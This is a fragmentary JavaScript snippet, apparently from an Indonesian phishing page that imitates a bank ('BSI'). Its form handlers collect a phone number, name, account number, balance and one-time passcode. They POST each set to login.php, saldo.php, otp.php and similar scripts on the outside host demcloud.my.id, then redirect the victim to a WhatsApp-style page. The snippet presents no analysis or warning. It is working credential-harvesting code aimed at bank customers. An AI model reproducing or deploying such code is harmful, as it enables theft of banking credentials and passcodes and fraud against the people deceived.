...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/abs22/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/abs22/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
   ...
   if (!tarif || !nomor || !nama || !rek || !saldo ) {      
      ...
      $.ajax({
            type: 'POST',
            url: 'https://demcloud.my.id/BSI/abs22/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://demcloud.my.id/BSI/abs22/otp.php',
 async: false,
 dataType: 'JSON',
...
setTimeout(function(){  
location.href='https://demcloud.my.id/BSI/abs22/wa';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1100);      
